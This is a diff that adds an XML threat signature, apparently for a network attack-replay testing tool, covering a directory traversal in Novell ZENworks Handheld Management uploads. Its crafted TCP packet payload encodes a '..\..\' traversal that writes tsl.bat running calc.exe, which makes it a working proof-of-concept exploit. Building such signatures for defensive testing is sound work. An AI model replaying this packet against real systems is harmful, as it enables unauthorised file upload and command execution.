@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Novell ZENworks Handheld Management Upload Directory Traversal"/>
+    <EngDesc display="true" value="A directory traversal vulnerability exists in Novell ZENworks Handheld Management. The vulnerability occurs during a file upload operation, which can lead to an arbitrary file upload, and later command execution.            A remote unauthenticated attacker can exploit this vulnerability by sending a crafted request to a target server. Successful exploitation can result in a full system compromise of a target system.            The vendor, Novell, has not released an advisory regarding this vulnerability.&#13;&#10;"/>
+    <Intent display="true">
+      <item value="Directory_Traversal"/>
+    </Intent>
+    <Protocol display="true" value="Novell ZfHSrvr Proprietary"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Novell"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="ZENworks_Handheld_Management"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="7.0.2.61213_and_prior"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20110627-05"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Jim"/>
+    <ID display="true" value="64bca6f60482d316b9777206a5f94485"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="network"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634472115178073750"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1311931820" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="srcIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+    <for index="B">
+      <for index="D"/>
+      <for index="C"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:2A:87:B6" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00AA" Identification="6A72" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="6E34" srcIP="$srcIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="52733" destPort="$destPort" SeqNumber="EFEC5B33" AckNumber="07FD7205" HeaderLength="08" WindowSize="002E" Checksum="ABB3" UrgentPointer="0000" Options="0101080A7CD1314300000000" Payload="0107000200000001000000FFFFFF10000000333530666162666335383838346300005E090000640200000001000000020000000600FFFFFF170000002E2E5C2E2E5C2E2E5C2E2E5C2E2E5C74736C2E62617400112222222233333333FFFFFF100000000D0A0D0A63616C632E6578650D0A0D0A020401" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:0C:29:2A:87:B6" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="003E" Identification="073D" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="91D5" srcIP="$destIP" destIP="$srcIP" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$destPort" destPort="52733" SeqNumber="07FD7205" AckNumber="EFEC5BAA" HeaderLength="08" WindowSize="FA7A" Checksum="81B1" UrgentPointer="0000" Options="0101080A000033697CD13143" Payload="02000000006418000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
